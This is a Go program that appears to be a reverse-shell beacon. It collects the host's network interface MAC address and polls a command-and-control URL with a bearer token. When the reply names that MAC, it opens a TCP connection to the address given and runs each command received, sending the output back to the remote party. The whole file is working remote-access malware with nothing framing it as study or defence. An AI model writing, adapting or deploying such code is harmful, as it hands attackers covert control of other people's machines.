package main

import (
	"bufio"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

func getMacAddr() ([]string, error) {
	ifas, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var as []string
	for _, ifa := range ifas {
		if ifa.Name == "wlan0" || ifa.Name == "eth0" || ifa.Name == "en0" {
			log.Println(ifa.Name)
			a := ifa.HardwareAddr.String()
			if a != "" {
				as = append(as, a)
			}
		}
	}
	return as, nil
}

func pollCommand(api string, token string) string {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", api, nil)
	req.Header.Set("Authorization", "Bearer "+token)

	resp, _ := client.Do(req)

	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)

	log.Printf("API: " + string(body))
	return string(body)
}

func checkBinExists(bin string) bool {
	_, err := exec.LookPath(bin)
	if err != nil {
		return false
	}

	return true
}

func main() {
	as, _ := getMacAddr()

	log.Printf("MAC:" + as[0])
	command := pollCommand(os.Args[1], os.Args[2])

	if strings.Contains(command, as[0]) {
		app := strings.Replace(command, as[0], "", -1)
		connection, err := net.Dial("tcp", app)
		if err != nil {
			if nil != connection {
				connection.Close()
			}
		}

		for {
			remoteCommands, _ := bufio.NewReader(connection).ReadString('\n')
			args := strings.Fields(strings.TrimSuffix(remoteCommands, "\n"))

			if checkBinExists(args[0]) {
				cmd := exec.Command(args[0], args[1:]...)
				pipe, _ := cmd.StdoutPipe()
				if err := cmd.Start(); err != nil {
					log.Fatal(err)
				}

				reader := bufio.NewReader(pipe)
				line, err := reader.ReadString('\n')

				for err == nil {
					line, err = reader.ReadString('\n')
					log.Printf(line)
					connection.Write([]byte(line))
				}
			} else {
				connection.Write([]byte("Command does not exist\n"))
			}
		}
	}
}
